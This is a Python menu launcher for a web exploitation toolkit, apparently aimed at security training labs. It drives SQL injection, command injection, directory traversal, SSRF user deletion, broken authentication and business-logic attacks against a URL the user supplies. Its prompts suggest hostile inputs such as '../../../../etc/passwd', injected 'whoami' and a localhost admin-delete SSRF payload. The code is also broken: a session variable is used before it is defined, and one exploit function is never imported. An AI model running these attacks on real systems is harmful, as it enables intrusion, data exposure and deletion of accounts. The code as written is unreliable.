import os
import sys
from datetime import datetime
import urllib3
import requests
from sql_injection import exploit_sqli
from command_injection import exploit_cmd_injection
from directory_traversal import directory_traversal_exploit
from access_control import delete_user as delete_user_access_control
from logger import log_to_file
from broken_authentication import access_carlos_account
from information_disclosure import output_version_number
from server_side_logic import buy_item
from ssrf import delete_user as delete_user_ssrf
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    print("(+) Select the type of vulnerability to scan or exploit:")
    print("1. All vulnerabilities ")
    print("2. Specific vulnerability")
    choice = input("> ").strip()

    if choice not in {"1", "2"}:
        print("[-] Invalid choice. Exiting.")
        sys.exit(-1)

    url = input("(+) Enter the target URL (e.g., https://www.example.com): ").strip()
    if not url:
        print("[-] No URL provided. Exiting.")
        sys.exit(-1)
 
    log_file_name = input("(+) Enter the file name to save the output (e.g., exploit_output): ").strip()
    if not log_file_name.endswith(".txt"):
        log_file_name += ".txt"
    log_file = os.path.join(os.getcwd(), log_file_name)

    log_to_file(f"Exploit started at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", log_file)

    if choice == "1":  # All vulnerabilities
        uri = input("(+) Enter the SQL injection endpoint (e.g., /filter?category=): ").strip()
        exploit_sqli(url, uri, log_file)
        
        command = input("(+) Enter the command to inject for command injection (e.g., whoami): ").strip()
        exploit_cmd_injection(url, command, log_file)
        
        filename = input("(+) Enter the filename for directory traversal (e.g., ../../../../etc/passwd): ").strip()
        directory_traversal_exploit(url, filename, log_file)
        
        admin_panel_path = input("(+) Enter the admin panel path (e.g., /admin-dashboard): ").strip()
        delete_user_access_control(url, admin_panel_path, log_file)
        
        
        product_path = input("(+) Enter the product path for information disclosure (e.g., /product?productId='): ").strip()
        output_version_number(url, product_path)
        
        # Add business logic vulnerability
        buy_item(s, url)
        
        # SSRF
        delete_user_ssrf_payload = input("(+) Enter the SSRF payload for deleting user (e.g., 'http://localhost/admin/delete?username=carlos'): ").strip()
        check_stock_path = input("(+) Enter the check stock path (e.g., '/product/stock'): ").strip()
        delete_user_ssrf(url, delete_user_ssrf_payload, check_stock_path)

    elif choice == "2":  # Specific vulnerability
        print("(+) Select a specific vulnerability to test:")
        print("1. SQL Injection")
        print("2. Command Injection")
        print("3. Directory Traversal")
        print("4. User Deletion")
        print("5. Broken Authentication")
        print("6. File Upload")
        print("7. Information Disclosure")
        print("8. Business Logic")  # New option for business logic
        print("9. SSRF")  # New option for SSRF
        vuln_choice = input("> ").strip()

        if vuln_choice == "1":
            uri = input("(+) Enter the SQL injection endpoint (e.g., /filter?category=): ").strip()
            exploit_sqli(url, uri, log_file)
        elif vuln_choice == "2":
            command = input("(+) Enter the command to inject (e.g., whoami): ").strip()
            exploit_cmd_injection(url, command, log_file)
        elif vuln_choice == "3":
            filename = input("(+) Enter the filename for directory traversal (e.g., ../../../../etc/passwd): ").strip()
            directory_traversal_exploit(url, filename, log_file)
        elif vuln_choice == "4":
            admin_panel_path = input("(+) Enter the admin panel path (e.g., /admin-dashboard): ").strip()
            delete_user_access_control(url, admin_panel_path, log_file)
        elif vuln_choice == "5":
            s = requests.Session()
            access_carlos_account(s, url)
        elif vuln_choice == "6":
            s = requests.Session()
            exploit_file_upload(s, url)
        elif vuln_choice == "7":
            product_path = input("(+) Enter the product path for information disclosure (e.g., /product?productId='): ").strip()
            output_version_number(url, product_path)
        elif vuln_choice == "8":  # Handle business logic
            s = requests.Session()
            buy_item(s, url)
        elif vuln_choice == "9":  # Handle SSRF
            delete_user_ssrf_payload = input("(+) Enter the SSRF payload for deleting user (e.g., 'http://localhost/admin/delete?username=carlos'): ").strip()
            check_stock_path = input("(+) Enter the check stock path (e.g., '/product/stock'): ").strip()
            delete_user_ssrf(url, delete_user_ssrf_payload, check_stock_path)
        else:
            log_to_file("[-] Invalid choice for specific vulnerability. Exiting.", log_file)

    log_to_file(f"Exploit finished at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", log_file)

if __name__ == "__main__":
    main() 